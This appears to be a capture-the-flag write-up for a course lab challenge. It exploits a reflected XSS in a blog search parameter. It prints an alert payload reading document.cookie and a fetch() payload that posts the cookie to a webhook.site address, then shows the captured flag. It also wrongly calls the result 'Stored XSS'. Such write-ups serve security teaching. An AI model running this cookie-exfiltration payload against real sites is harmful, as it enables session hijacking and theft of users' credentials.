# Challenge `Just My Boring Cookies` writeup

- Vulnerability:
  - _Endpoint has a **Cross Site Scripting (XSS)** vulnerability_
- Where:
  - _`/?search=` endpoint_
- Impact:
  - _Allows to **obtain our cookies** given to us by the by injecting malicious code in the webpage_

## Steps to reproduce

First we connected to the server `http://mustard.stt.rnl.tecnico.ulisboa.pt:22251`. We can see that the server has a search bar for blog posts. If we search for something, we can see that the search is reflected in the page, like this `/?search=`. This means that the server is probably vulnerable to **XSS**.

Since this challenge is fairly simple, we can just try to inject some code in the search bar. We tried to inject `<script>alert(document.cookie)</script>` and it worked! We got the following popup with our cookie:

```SECRET="SSof{YOU_DO_NOT_HAVE_SECRETS}";```

Although we already have the flag, we sent the cookies to a website we control so we can have a Stored XSS. Since we did not have any site of our own we used a online service to collect our https requests [Webhook](https://webhook.site/). 
Now that we have somewhere to store the resquests we sent the following payload:

```html
<script>fetch('https://webhook.site/888f0a4e-7b59-4ac7-93fd-19035f634790', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>
```

After this we received a ``POST`` with the Raw Content of:
```SECRET="SSof{YOU_DO_NOT_HAVE_SECRETS}"```

Now, we not only were able to get the cookie from an alert, but we were also able to send it to a website we control. This means that we now have possession of the **flag**.
